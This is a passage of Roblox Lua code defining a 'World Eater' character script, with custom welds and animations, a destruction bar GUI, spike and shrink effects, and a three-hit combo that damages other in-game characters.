rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3, 0.9, .5) * CFrame.Angles(math.rad(-10-20*math.cos(sine/4)/2), math.rad(-40+10*math.cos(sine/4)/2), math.rad(50-10*math.cos(sine/4)/2)), 0.2)
larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3, 0.9, .5)*CFrame.Angles(math.rad(10+20*math.cos(sine/4)/2), math.rad(40-10*math.cos(sine/4)/2), math.rad(-50+10*math.cos(sine/4)/2)), 0.2)
hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,3,0)*CFrame.Angles(math.rad(6+6*math.cos(sine/4)/1.8), math.rad(0), math.rad(0)),0.2)
torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.2+0.2*math.cos(sine/4)/2, 0) * CFrame.Angles(math.rad(-14+10*math.cos(sine/4)/2), 0, math.rad(0)), 0.2)
lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1, -3-0.44*math.cos(sine/8)/2.4, -.15 + math.sin(sine/8)/1.5) * CFrame.Angles(math.rad(-20) + -math.sin(sine/8)/1.7, 0, 0), .4)
rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1, -3+0.44*math.cos(sine/8)/2.4, -.15 + -math.sin(sine/8)/1.5) * CFrame.Angles(math.rad(-20) + math.sin(sine/8)/1.7, 0, 0), .4)
cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1.85, -.9) * CFrame.Angles(math.rad(-90), math.rad(-90), math.rad(0)), 1)
end
end
--[[if animpose == "Walking" then
    if footsteps == false then
        x:Play()
        footsteps = true
    end
    x.Pitch = 1.1
elseif animpose == "Idle" then
    x:Stop()
    footsteps = false
elseif animpose == "Running" then
    x.Pitch = 1.2
    if footsteps == false then
        x:Play()
        footsteps = true
    end
end]]--
end)
end}

 
 

module[1] = {"WorldEater",function()
--[[ World eater Script ]]--
--[[ Declarations ]]--
wait(.0000000000000000000001)
local Player = game:GetService("Players").LocalPlayer
local Character = Player.Character
local Head = Character.Head
local Torso = Character.Torso
local Right_Arm = Character["Right Arm"]
local Right_Leg = Character["Right Leg"]
local Left_Arm = Character["Left Arm"]
local Left_Leg = Character["Left Leg"]
local Humanoid = Character.Humanoid
local Animation = "Idle"
local Mouse = Player:GetMouse()
local LeftShoulder = Torso["Left Shoulder"] 
local Left_Hip = Torso["Left Hip"] 
local RightShoulder = Torso["Right Shoulder"] 
local Right_Hip = Torso["Right Hip"] 
local Root = Character.HumanoidRootPart
local RootJoint = Root.RootJoint
local Attacking = false
local CanAttack = true
local Anim = "Idle"
local Combo = 1 
local Blocking = false
local MaxDestruction = 1000
local Destruction = 0
local MaxBlock = 100
local Effects = {}
local Color = "Bright yellow"
local Invert = false
local Idle = 0
local Equipped = false
local Running = false
local Unseathed = false
local Shard = "None"

Humanoid.MaxHealth = 3000
Humanoid.Health = 3000

local WorldEaterTheme = Instance.new("Sound",Character)
WorldEaterTheme.Name = "WorldEaterTheme"
WorldEaterTheme.Looped = true
WorldEaterTheme.SoundId = "http://www.roblox.com/asset?id=149981769"
WorldEaterTheme:Play()

Left_Shoulder = Instance.new("Weld", Torso)
Left_Shoulder.Part0 = Torso
Left_Shoulder.Part1 = Left_Arm
Left_Shoulder.Name = "Left Shoulder"
Left_Shoulder.C0 = CFrame.new(-1.5,0,0)

Right_Shoulder = Instance.new("Weld", Torso)
Right_Shoulder.Part0 = Torso
Right_Shoulder.Part1 = Right_Arm
Right_Shoulder.Name = "Right Shoulder"
Right_Shoulder.C0 = CFrame.new(1.5,0,0)

LeftShoulder.Parent = nil
RightShoulder.Parent = nil
Humanoid.WalkSpeed = 10

local RootCFrame = CFrame.fromEulerAnglesXYZ(-1.57,0,3.14)
Necko = CFrame.new(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
Necko2 = CFrame.new(0, -0.5, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
Right_Hip_C1 = CFrame.new(0.5, 1, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
Left_Hip_C1 = CFrame.new(-0.5, 1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)


Movemment = 1
Walk = 0

Animator = Humanoid.Animator
--Animate = Character.Animate

Animator.Parent = nil
--Animate.Parent = nil

local Services = {

SoundService = game:GetService("SoundService");
Players = game:GetService("Players");
Debris = game:GetService("Debris");
Workspace = game:GetService("Workspace");
Lighting = game:GetService("Lighting");
HttpService = game:GetService("HttpService");
InsertService = game:GetService("InsertService");
	
}

local ManaBarGUI = Instance.new("ScreenGui", Player.PlayerGui)
ManaBarGUI.Name = "ManaBarGUI"

local ManaBarP1 = Instance.new("Frame", ManaBarGUI)
ManaBarP1.Name = "ManaBarPart1"
ManaBarP1.Size = UDim2.new(0,300,0,20)
ManaBarP1.Position = UDim2.new(0,350,0.1,0)
ManaBarP1.BackgroundColor3 = BrickColor.Black().Color

local ManaBarP2 = Instance.new("Frame", ManaBarP1)
ManaBarP2.Name = "ManaBarPart2"
ManaBarP2.Size = UDim2.new(0,300,0,20)
ManaBarP2.Position = UDim2.new(0,0,0,0)
ManaBarP2.BackgroundColor3 = BrickColor.new("Black").Color

local ManaBarText = Instance.new("TextLabel", ManaBarP1)
ManaBarText.Name = "ManaBarText"
ManaBarText.Size = UDim2.new(0,300,0,20)
ManaBarText.Position = UDim2.new(0,0,-1.5,0)	
ManaBarText.TextScaled = true
ManaBarText.Text = "<{[ Destruction ]}> 0 <{[ Destruction ]}>"
ManaBarText.BackgroundTransparency = 1
ManaBarText.TextStrokeTransparency = 0
ManaBarText.TextStrokeColor3 = Color3.new(1,1,1)
ManaBarText.TextColor3 = Color3.new(0,0,0)
ManaBarText.Font = "Garamond"

local WorldEaterGui = Instance.new("BillboardGui", Head)
WorldEaterGui.ExtentsOffset = Vector3.new(0,5,0)
WorldEaterGui.Adornee = Head
WorldEaterGui.AlwaysOnTop = true
WorldEaterGui.Enabled = true
WorldEaterGui.Size = UDim2.new(0, 200,0, 50)

local WorldEaterText = Instance.new("TextLabel", WorldEaterGui)
WorldEaterText.BackgroundTransparency = 1
WorldEaterText.Font = "Garamond"
WorldEaterText.Size = UDim2.new(0, 200,0, 50)
WorldEaterText.TextStrokeColor3 = BrickColor.Red().Color
WorldEaterText.TextStrokeTransparency = 0
WorldEaterText.TextColor3 = BrickColor.Black().Color
WorldEaterText.TextScaled = true
WorldEaterText.Text = "World Eater"

--------[[ Mesh Ids ]]--------

SpikeMeshId = 1033714
SpikeBallId = 9982590
StarMeshId = 45428961
CrystalMeshId = 9756362

--[[ Essential Functions ]]--
function NoOutlines(Part)
		Part.TopSurface,Part.BottomSurface,Part.LeftSurface,Part.RightSurface,Part.FrontSurface,Part.BackSurface = 10,10,10,10,10,10
end
	

local CreatePart = function(Parent, Name, Color, Size, Material, Transparency, Shape)

local Part = Instance.new("Part", Parent)
Part.Name = Name
Part.BrickColor = BrickColor.new(Color)
Part.Size = Size
Part.Material = Material
Part.Transparency = Transparency
Part.Shape = Shape
Part.CanCollide = false
NoOutlines(Part)

return Part

end

local CreateMesh = function(Parent, Scale, Shape)


local Mesh = Instance.new("BlockMesh", Parent)
Mesh.Scale = Scale

return Mesh

end

local CreateWedge = function(Parent, Name, Color, Size, Material, Transparency)

local WedgePart = Instance.new("WedgePart", Parent)
WedgePart.Name = Name
WedgePart.BrickColor = BrickColor.new(Color)
WedgePart.Size = Size
WedgePart.Material = Material
WedgePart.Transparency = Transparency
WedgePart.CanCollide = false
NoOutlines(WedgePart)

return WedgePart

end

local CreateWeld = function(Parent, Cframe, P1 , P0)
	
local Weld = Instance.new("Weld", Parent)
Weld.Part0 = P0
Weld.Part1 = P1
Weld.Name = P0.Name .. "To" .. P1.Name
Weld.C0 = Cframe

return Weld	
	
end

local CreateVelocity = function(Parent,Velocity,Force)
	
local BodyVelocity = Instance.new("BodyVelocity", Parent)
BodyVelocity.Velocity = Velocity
BodyVelocity.MaxForce = Force	

	
	
return BodyVelocity	
	
end


local CreateCrystal = function(Parent, Name, Color, Size, Material, Transparency, Scale)


local Part = Instance.new("Part", Parent)
Part.Name = Name
Part.BrickColor = BrickColor.new(Color)
Part.Size = Size
Part.Material = Material
Part.Transparency = Transparency
Part.CanCollide = false
NoOutlines(Part)

local Mesh = Instance.new("SpecialMesh", Part)
Mesh.MeshId = "http://www.roblox.com/asset?id=" .. CrystalMeshId
Mesh.Scale = Scale

return Mesh and Part

end

local MakeSFX = function(Parent, Id, Volume, Pitch, Type)
	
local SFX = Instance.new("Sound", Parent)
SFX.SoundId = "http://www.roblox.com/asset?id=" .. Id
SFX.Name = "SFX"
SFX:Play()
SFX.Volume = Volume
SFX.Pitch = Pitch
SFX.PlayOnRemove = true
SFX:Remove()
	
if Type == "Echo" then
	
Instance.new("EchoSoundEffect", SFX)	
	
end	
	
end

local CreateSpike = function(Parent, Name, Color, Size, Material, Transparency, Scale)


local Part = Instance.new("Part", Parent)
Part.Name = Name
Part.BrickColor = BrickColor.new(Color)
Part.Size = Size
Part.Material = Material
Part.Transparency = Transparency
Part.CanCollide = false
NoOutlines(Part)

local Mesh = Instance.new("SpecialMesh", Part)
Mesh.MeshId = "http://www.roblox.com/asset?id=" .. SpikeMeshId
Mesh.Scale = Scale

return Mesh and Part

end

CircleEffect = function(Position, Parent, DSX, DSY, DSZ, SX, SY, SZ, Time, Brickcolor, Material, Transparency)
	
local Part = Instance.new("Part", Parent)
Part.Transparency = Transparency
Part.Name = "CircleEffect"
Part.Size = Vector3.new()
Part.Anchored = true
Part.CanCollide = false
Part.Position = Position
Part.BrickColor = BrickColor.new(Brickcolor)
Part.Material = Material
NoOutlines(Part)

local Mesh = Instance.new("SpecialMesh", Part)
Mesh.MeshType = "Sphere"
Mesh.Scale = Vector3.new(DSX, DSY, DSZ)

Services.Debris:AddItem(Part, Time)


table.insert(Effects, {Part, "Circle", Time, SX, SY, SZ})


end

BlockEffect = function(Position, Parent, DSX, DSY, DSZ, SX, SY, SZ, Time, Brickcolor, Material, Transparency)
	
local Part = Instance.new("Part", Parent)
Part.Transparency = Transparency
Part.Name = "BlockEffect"
Part.Size = Vector3.new()
Part.Anchored = true
Part.Position = Position
Part.CanCollide = false
Part.BrickColor = BrickColor.new(Brickcolor)
Part.Material = Material
NoOutlines(Part)

local Mesh = Instance.new("BlockMesh", Part)
Mesh.Scale = Vector3.new(DSX, DSY, DSZ)

Services.Debris:AddItem(Part, Time)

table.insert(Effects, {Part, "Block", Time, SX, SY, SZ})


end

--[[ Damage function ]]--


function DamageFunction(Hit, Part, Type, HitSFX, Knockback, Min, Max)
	
local HitHumanoid = Hit.Parent.Humanoid


local Damage = math.random(Min, Max)


coroutine.resume(coroutine.create(function()
HitHumanoid:TakeDamage(Damage)
end))
	
if Type == "Shrink" then
MakeSFX(Hit.Parent.Torso, 209527235, 1, 1)	
for i,v in pairs(Hit.Parent:children()) do
if v:IsA("Part") then
coroutine.resume(coroutine.create(function()		
for i = 1,100 do
wait()	
v.Size = v.Size - Vector3.new(0.05,0.05,0.05)
v.Transparency = v.Transparency + 0.05
	
end		
end))
end	
end
	
end	
	
	
	
if Type == "Normal" then
	
local Push = CreateVelocity(Hit.Parent.Torso, Torso.CFrame.lookVector * Knockback, Vector3.new(math.huge,math.huge,math.huge))
Services.Debris:AddItem(Push, 0)	
DamageLabel(Hit.Parent, Damage, Hit)

elseif Type == "Ranged" then
local Push = CreateVelocity(Hit.Parent.Torso, Part.CFrame.lookVector * Knockback, Vector3.new(math.huge,math.huge,math.huge))
Services.Debris:AddItem(Push, 0)	
DamageLabel(Hit.Parent, Damage, Hit)

elseif Type == "Impale" then

local Spike = CreateSpike(Services.Workspace, "D e a t h", "Black", Vector3.new(), "SmoothPlastic", 0, Vector3.new(1,20,1))	
Spike.Anchored = true
Spike.Rotation = Vector3.new(math.random(-50,50), 0 , math.random(-50,50))
Spike.Position = Hit.Parent.Torso.Position


Services.Debris:AddItem(Spike, 30)

Hit.Parent:BreakJoints()
Hit.Parent.Torso.Position = Spike.Position + Vector3.new(0,5,0)
Hit.Parent.Torso.Anchored = true
	
MakeSFX(Spike, 306247724, 1,1)	
MakeSFX(Hit.Parent.Torso, 209527175, 10,1)
elseif Type == "Knockdown" then
	
		
local Push = CreateVelocity(Hit.Parent.Torso, Part.CFrame.lookVector * Knockback, Vector3.new(math.huge,math.huge,math.huge))
DamageLabel(Hit.Parent, Damage, Hit)
Services.Debris:AddItem(Push, 0.3)

coroutine.resume(coroutine.create(function()
	
HitHumanoid.PlatformStand = true
wait(1)
HitHumanoid.PlatformStand = false	
	
	
end))	
end

if HitSFX == "Penetration" then
	
MakeSFX(Hit, 199149269, 1 , 1)

elseif HitSFX == "Punch" then
	
MakeSFX(Hit, 278062209, 1 , 1)
	
	
	
	
end
end

function DamageLabel(HitCharacter, DamageDealt, Hit)
	
local DamageShowingPart = CreatePart(Services.Workspace, "ShowDamage", "Bright yellow", Vector3.new(0.8,0.8,0.8), "Neon", 1, "Block")
DamageShowingPart.Position = HitCharacter.Head.Position

local DamageGui = Instance.new("BillboardGui", DamageShowingPart)
DamageGui.Name = "Damage"
DamageGui.AlwaysOnTop = true
DamageGui.Size = UDim2.new(5, 0, 5, 0)

local DamageNumber = Instance.new("TextLabel", DamageGui)
DamageNumber.Size = UDim2.new(1,0,1,0)
if Hit.Parent:FindFirstChild("Head") then
DamageNumber.TextStrokeColor3 = Hit.Parent.Head.BrickColor.Color
DamageNumber.TextColor3 = Hit.BrickColor.Color
end
DamageNumber.TextStrokeTransparency = 0
DamageNumber.BackgroundTransparency = 1
DamageNumber.Font = "SourceSansBold"
DamageNumber.TextScaled = true
DamageNumber.Text = DamageDealt
	
local BodyVelocity = Instance.new("BodyVelocity", DamageShowingPart)
BodyVelocity.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
BodyVelocity.Velocity = Vector3.new(0,2,0)	
	
Services.Debris:AddItem(DamageShowingPart, 3)
	
	
end 

function ValidateDamage(Part, Distance ,Min , Max, Type, HitSFX, Knockback)
for _,WorkspaceChildren in pairs(workspace:children()) do
	
local HitHumanoid = WorkspaceChildren:findFirstChild("Humanoid")

if HitHumanoid ~= nil then
local Hit = WorkspaceChildren:findFirstChild("Torso")

if Hit ~= nil then
	
local Target = Hit.Position - Part.Position

local Magnitude = Target.magnitude

if Magnitude <= Distance and WorkspaceChildren.Name ~= Player.Name then
	
local HitBlock = Hit.Parent:FindFirstChild("Block")	
	
if HitBlock ~= nil and HitBlock:FindFirstChild("BlockDurability") and HitBlock.Value == true then

local HitBlock2 = Hit.Parent.Block.BlockDurability	
	
if HitBlock2.Value > 15 then
	
local HitN = math.random(1,5)
	
HitBlock2.Value = HitBlock2.Value - 15	
	
	
if HitN == 1 then
MakeSFX(Hit ,199148971, 0.5, 1)	
end

if HitN == 2 then
MakeSFX(Hit ,199149025, 0.5, 1)	
end

if HitN == 3 then
MakeSFX(Hit ,199149072, 0.5, 1)	
end

if HitN == 4 then
MakeSFX(Hit ,199149109, 0.5, 1)	
end

if HitN == 5 then
MakeSFX(Hit ,199149119, 0.5, 1)	
end
return
end	
end

DamageFunction(Hit, Part, Type, HitSFX, Knockback, Min, Max)

	

end
end
end
end
end
 


local Cloak = Instance.new("Part", Character)
Cloak.Name = "Cloak"
Cloak.CanCollide = false
Cloak.BrickColor = BrickColor.new("Institutional white")

local CloakMesh = Instance.new("SpecialMesh", Cloak)
CloakMesh.MeshId = "http://www.roblox.com/asset?id=16150814"
CloakMesh.TextureId = "http://www.roblox.com/asset?id=16150799"

local CloakWeld = CreateWeld(Cloak, CFrame.new(0,0,0) * CFrame.Angles(0,0,0), Head , Cloak, "ArkusToCharacter")

for i,v in pairs(Character:children()) do
if v:IsA("Accessory") then
	v:Remove()
elseif v:IsA("Shirt") then
	v:Remove()
elseif v:IsA("Pants") then
	v:Remove()	
elseif v:IsA("BodyColors") then

Head.BrickColor =BrickColor.new("Really black")
Torso.BrickColor = BrickColor.new("Really black")
Right_Arm.BrickColor = BrickColor.new("Really black")
Right_Leg.BrickColor = BrickColor.new("Really black")
Left_Arm.BrickColor = BrickColor.new("Really black")
Left_Leg.BrickColor = BrickColor.new("Really black")

v.HeadColor = BrickColor.new("Really black")
v.TorsoColor = BrickColor.new("Really black")
v.RightArmColor = BrickColor.new("Really black")
v.LeftArmColor = BrickColor.new("Really black")
v.RightLegColor = BrickColor.new("Really black")
v.LeftLegColor = BrickColor.new("Really black")
	
end	
end



--[[ CLerp Declarations ]]--

function clerp(a,b,t)
	local qa = {QuaternionFromCFrame(a)}
	local qb = {QuaternionFromCFrame(b)} 
	local ax, ay, az = a.x, a.y, a.z 
	local bx, by, bz = b.x, b.y, b.z
	local _t = 1-t
	return QuaternionToCFrame(_t*ax + t*bx, _t*ay + t*by, _t*az + t*bz,QuaternionSlerp(qa, qb, t)) 
end 
 
function QuaternionFromCFrame(cf) -- dis one
	local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components() 
	local trace = m00 + m11 + m22 
	if trace > 0 then 
		local s = math.sqrt(1 + trace) 
		local recip = 0.5/s 
		return (m21-m12)*recip, (m02-m20)*recip, (m10-m01)*recip, s*0.5 
	else 
		local i = 0 
		if m11 > m00 then
			i = 1
		end
		if m22 > (i == 0 and m00 or m11) then 
			i = 2 
		end 
		if i == 0 then 
			local s = math.sqrt(m00-m11-m22+1) 
			local recip = 0.5/s 
			return 0.5*s, (m10+m01)*recip, (m20+m02)*recip, (m21-m12)*recip 
		elseif i == 1 then 
			local s = math.sqrt(m11-m22-m00+1) 
			local recip = 0.5/s 
			return (m01+m10)*recip, 0.5*s, (m21+m12)*recip, (m02-m20)*recip 
		elseif i == 2 then 
			local s = math.sqrt(m22-m00-m11+1) 
			local recip = 0.5/s return (m02+m20)*recip, (m12+m21)*recip, 0.5*s, (m10-m01)*recip 
		end 
	end 
end
 
function QuaternionToCFrame(px, py, pz, x, y, z, w) 
	local xs, ys, zs = x + x, y + y, z + z 
	local wx, wy, wz = w*xs, w*ys, w*zs 
	local xx = x*xs 
	local xy = x*ys 
	local xz = x*zs 
	local yy = y*ys 
	local yz = y*zs 
	local zz = z*zs 
	return CFrame.new(px, py, pz,1-(yy+zz), xy - wz, xz + wy,xy + wz, 1-(xx+zz), yz - wx, xz - wy, yz + wx, 1-(xx+yy)) 
end
 
function QuaternionSlerp(a, b, t) 
	local cosTheta = a[1]*b[1] + a[2]*b[2] + a[3]*b[3] + a[4]*b[4] 
	local startInterp, finishInterp; 
	if cosTheta >= 0.0001 then 
		if (1 - cosTheta) > 0.0001 then 
			local theta = math.acos(cosTheta) 
			local invSinTheta = 1/math.sin(theta) 
			startInterp = math.sin((1-t)*theta)*invSinTheta 
			finishInterp = math.sin(t*theta)*invSinTheta  
		else 
			startInterp = 1-t 
			finishInterp = t 
		end 
	else 
		if (1+cosTheta) > 0.0001 then 
			local theta = math.acos(-cosTheta) 
			local invSinTheta = 1/math.sin(theta) 
			startInterp = math.sin((t-1)*theta)*invSinTheta 
			finishInterp = math.sin(t*theta)*invSinTheta 
		else 
			startInterp = t-1 
			finishInterp = t 
		end 
	end 
	return a[1]*startInterp + b[1]*finishInterp, a[2]*startInterp + b[2]*finishInterp, a[3]*startInterp + b[3]*finishInterp, a[4]*startInterp + b[4]*finishInterp 
end

function RayCast(Pos, Dir, Max, Ignore)
	return game:service("Workspace"):FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999.999)), Ignore) 
end 


function Bars()
	
--[[ Mana Bar ]]--	
if Destruction ~= MaxDestruction then
	
Destruction = Destruction + 1

end

if Destruction >= MaxDestruction then
	
Destruction = Destruction
	
end


ManaBarText.Text = "<{[ Destruction ]}> <|"..Destruction.."|> <{[ Destruction ]}>"

ManaBarP2.Size = UDim2.new(Destruction / Destruction,0,0,20)	
	
end
local EyeReference = CreatePart(Character, "Reference", "Dark stone grey", Vector3.new(), "SmoothPlastic", 1, "Block")
local EyeReferenceWeld = CreateWeld(EyeReference,  CFrame.new(0.15,-0.1,-0.7), EyeReference, Head)

coroutine.resume(coroutine.create(function()
	
while wait(3) do

	
CircleEffect(EyeReference.Position, Services.Workspace,  1, 1, 1, 1, 1, 1, 0.5, "Bright red", "Neon", 0.5)
	
	
end
	
end))
--[[ Attacks ]]--

function Attack1()
Attacking = true
MakeSFX(EyeReference, 341336274, 1,1)
wait(0.3)
local Reference = CreatePart(Services.Workspace, "Reference", "Dark stone grey", Vector3.new(), "SmoothPlastic", 1, "Block")
local ReferenceWeld = CreateWeld(Reference,  CFrame.new(0,0.5,-5), Reference, Root)

local Reference2 = CreatePart(Services.Workspace, "Reference", "Dark stone grey", Vector3.new(), "SmoothPlastic", 1, "Block")
local Reference2Weld = CreateWeld(Reference2,  CFrame.new(0,0.5,-2), Reference2, Root)


for i = 1,10 do

wait()
RootJoint.C0 = clerp(RootJoint.C0,RootCFrame*CFrame.new(0,0,0)* CFrame.Angles(0,0,-1.6),0.5)
Torso.Neck.C0 = clerp(Torso.Neck.C0,Necko * CFrame.Angles(0,0,1.3),0.2)
Right_Shoulder.C0 = clerp(Right_Shoulder.C0, CFrame.new(1.5, 0.1, 0) * CFrame.Angles(0,0,0.2), 0.3)
Left_Shoulder.C0 = clerp(Left_Shoulder.C0,  CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(0,0,-1.6), 0.4)
Right_Hip.C0=clerp(Right_Hip.C0,CFrame.new(1,-1,0) * CFrame.Angles(0,1.6,0),0.3)
Left_Hip.C0=clerp(Left_Hip.C0,CFrame.new(-1,-1,0) * CFrame.Angles(0,-1.6,0),0.3) 

end

CircleEffect(Reference2.Position, Services.Workspace,  50, 50, 50, -5, -5, -5, 5, "Bright red", "Neon", 0.5)
wait(0.5)
CircleEffect(Reference2.Position, Services.Workspace,  50, 50, 50, -5, -5, -5, 5, "Bright red", "Neon", 0.5)
wait(0.5)
CircleEffect(Reference2.Position, Services.Workspace,  50, 50, 50, -5, -5, -5, 5, "Bright red", "Neon", 0.5)
wait(0.5)
CircleEffect(Reference2.Position, Services.Workspace,  50, 50, 50, -5, -5, -5, 5, "Bright red", "Neon", 0.5)
wait(0.5)
MakeSFX(Reference, 306247724, 1,1)	
CircleEffect(Reference.Position, Services.Workspace,  1, 1, 1, 5, 5, 5, 5, "Bright red", "Neon", 0.5)
ValidateDamage(Reference, 10 ,10 , 14, "Shrink", "Penetration", 5)
Attacking = false
end

function Attack2()
	
Attacking = true
Humanoid.WalkSpeed = 0
Humanoid.JumpPower = 0


for i = 1,25 do
wait()

RootJoint.C0 = clerp(RootJoint.C0,RootCFrame*CFrame.new(0,0,0)* CFrame.Angles(-0.5,0,0),0.2)
Torso.Neck.C0 = clerp(Torso.Neck.C0,Necko * CFrame.Angles(-0.5,0,0),0.3)
Right_Shoulder.C0 = clerp(Right_Shoulder.C0, CFrame.new(1, 1, 0) * CFrame.Angles(3.2,0,-0.6), 0.3)
Left_Shoulder.C0 = clerp(Left_Shoulder.C0, CFrame.new(-1, 1, 0) * CFrame.Angles(3.2,0,0.6), 0.3)
Right_Hip.C0=clerp(Right_Hip.C0,CFrame.new(1,-1,0)*CFrame.Angles(0,1.6,-0.3),0.2)
Left_Hip.C0=clerp(Left_Hip.C0,CFrame.new(-1,-1,-0.5)*CFrame.Angles(0,-1.6,0),0.2)
	
end

MakeSFX(Torso, 142070127, 1, 1)
ValidateDamage(Torso, 60 ,23, 26, "Knockdown", "Penetration", 15)
local Hit, Position = RayCast(Torso.Position,(CFrame.new(Root.Position,Root.Position - Vector3.new(0,1,0))).lookVector,100,Character)
if Hit ~= nil then
local Reference = CreatePart(Services.Workspace, "Reference", "Dark stone grey", Vector3.new(), "SmoothPlastic", 1, "Block")
Reference.Anchored = true
Reference.CFrame = CFrame.new(Position)

CircleEffect(Reference.Position, Services.Workspace,  1, 1, 1, 5, 5, 5, 5, "Bright red", "Neon", 0.5)

game:GetService("Debris"):AddItem(Reference,0.1)
for i=1,50 do
	
local Ground = CreatePart(Services.Workspace, "Ground", Hit.BrickColor.Color, Vector3.new(math.random(1,3), math.random(1,3), math.random(1,3)), Hit.Material, 0, "Block")
Ground.Anchored = true
Ground.CanCollide = true
Ground.CFrame = CFrame.new(Position) * CFrame.new(math.random(-30,30), 0, math.random(-30,30)) * CFrame.Angles(math.random(-50,50),math.random(-50,50), math.random(-50,50))

game:GetService("Debris"):AddItem(Ground,10)

end
end
	
for i = 1,25 do
wait()

RootJoint.C0 = clerp(RootJoint.C0,RootCFrame*CFrame.new(0,0,0)* CFrame.Angles(0,0,0),0.5)
Torso.Neck.C0 = clerp(Torso.Neck.C0,Necko * CFrame.Angles(0.5,0,0),0.3)
Right_Shoulder.C0 = clerp(Right_Shoulder.C0, CFrame.new(1.5, 0, 0.1) * CFrame.Angles(-0.2,0,0), 0.3)
Left_Shoulder.C0 = clerp(Left_Shoulder.C0, CFrame.new(-1.5, 0, 0.1) * CFrame.Angles(-0.2,0,0), 0.3)
Right_Hip.C0=clerp(Right_Hip.C0,CFrame.new(1,-1,0)*CFrame.Angles(0,1.6,-0.3),0.2)
Left_Hip.C0=clerp(Left_Hip.C0,CFrame.new(-1,-1,-0.5)*CFrame.Angles(0,-1.6,0),0.2)
	
end

Attacking = false
Humanoid.WalkSpeed = 16
Humanoid.JumpPower = 50
	
	
	
end


function Attack3()
Humanoid.WalkSpeed = 0
Humanoid.JumpPower = 0
Attacking = true
wait(1)
MakeSFX(Torso, 341336274, 1, 1.2)
CircleEffect(Torso.Position, Services.Workspace,  1, 1, 1, 20, 20, 20, 5, "Black", "Neon", 0.5)
wait(1)
MakeSFX(Torso, 341336274, 1, 1.2)
CircleEffect(Torso.Position, Services.Workspace,  1, 1, 1, 20, 20, 20, 5, "Black", "Neon", 0.5)
wait(1)
MakeSFX(Torso, 341336274, 1, 1.2)
CircleEffect(Torso.Position, Services.Workspace,  1, 1, 1, 20, 20, 20, 5, "Black", "Neon", 0.5)
ValidateDamage(Torso, 60 ,0, 0, "Impale", "Penetration", 15)
Humanoid.WalkSpeed = 16
Humanoid.JumpPower = 50
Attacking = false
end

Mouse.Button1Down:connect(function()
if not Attacking then
if Combo == 1 then

Combo = 2
Attack1()


elseif Combo == 2 then

Attack2()
Combo = 3

elseif Combo == 3 then
	
Attack3()
Combo = 1

end	
end
end)

--[[ CLerp Animations ]]--
Change1 = 0
Change2 = 0
Change3 = 0
Change4 = 0

while true do
wait()

local Torvel = (Root.Velocity*Vector3.new(1,0,1)).magnitude 
local Velderp = Root.Velocity.y
HitFloor,PosFloor = RayCast(Root.Position,(CFrame.new(Root.Position,Root.Position - Vector3.new(0,1,0))).lookVector,4,Character)	

Bars()


if Torvel < 1 and HitFloor ~= nil and Attacking == false then
Anim = "Idle"
	
RootJoint.C0 = clerp(RootJoint.C0,RootCFrame*CFrame.new(0,0,0)* CFrame.Angles(0,0,0),0.2)
Torso.Neck.C0 = clerp(Torso.Neck.C0,Necko * CFrame.Angles(0,-0.3,0),0.3)
Right_Shoulder.C0 = clerp(Right_Shoulder.C0, CFrame.new(1.5, 0.1, 0) * CFrame.Angles(0,0,0.2), 0.3)
Left_Shoulder.C0 = clerp(Left_Shoulder.C0, CFrame.new(-1.5, 0.1, 0) * CFrame.Angles(0,0,-0.2), 0.3)
Right_Hip.C0=clerp(Right_Hip.C0,CFrame.new(1,-1,0)*CFrame.Angles(0,1.6,0) * CFrame.Angles(-0.1,0,0),0.2)
Left_Hip.C0=clerp(Left_Hip.C0,CFrame.new(-1,-1,0)*CFrame.Angles(0,-1.6,0) * CFrame.Angles(-0.1,0,0),0.2)

end


if 2 < Torvel and Torvel < 22 and HitFloor ~= nil and Attacking == false then
Anim = "Walking"

if Invert == false then
Change1 = Change1 + 0.1

elseif Invert == true then
	
Change1 = Change1 - 0.1

end

if Change1 > 0.5 then
	
Invert = true

elseif Change1 < -0.5 then

Invert  = false

end

if Attacking == false then

RootJoint.C0 = clerp(RootJoint.C0,RootCFrame*CFrame.new(0,0,0)* CFrame.Angles(0,0,0),0.2)
Torso.Neck.C0 = clerp(Torso.Neck.C0,Necko * CFrame.Angles(0,-0.3,0),0.3)
Right_Shoulder.C0 = clerp(Right_Shoulder.C0, CFrame.new(1.5, 0, -Change1) * CFrame.Angles(Change1,0,0), 0.3)
Left_Shoulder.C0 = clerp(Left_Shoulder.C0, CFrame.new(-1.5, 0, Change1) * CFrame.Angles(-Change1,0,0), 0.3)
Right_Hip.C0=clerp(Right_Hip.C0,CFrame.new(1,-1,-Change1 / 4)*CFrame.Angles(Change1,1.6,0),0.2)
Left_Hip.C0=clerp(Left_Hip.C0,CFrame.new(-1,-1,Change1 / 4)*CFrame.Angles(-Change1,-1.6,0),0.2)

end
end

if Root.Velocity.y > 1 and HitFloor == nil and Attacking == false then 
Anim = "Jump"
	
RootJoint.C0 = clerp(RootJoint.C0,RootCFrame*CFrame.new(0,0,0)* CFrame.Angles(0,0,0),0.2)
Torso.Neck.C0 = clerp(Torso.Neck.C0,Necko * CFrame.Angles(-0.5,0,0),0.3)
Right_Shoulder.C0 = clerp(Right_Shoulder.C0, CFrame.new(1.5, 0, 0.2) * CFrame.Angles(-0.4,0,0.2), 0.3)
Left_Shoulder.C0 = clerp(Left_Shoulder.C0, CFrame.new(-1.5, 0, 0.2) * CFrame.Angles(-0.4,0,-0.2), 0.3)
Right_Hip.C0=clerp(Right_Hip.C0,CFrame.new(1,-1,-0.2)*CFrame.Angles(-0.2,1.6,0),0.2)
Left_Hip.C0=clerp(Left_Hip.C0,CFrame.new(-1,-1,0)*CFrame.Angles(0,-1.6,0),0.2)

end

if Root.Velocity.y < -1 and HitFloor == nil and Attacking == false then 
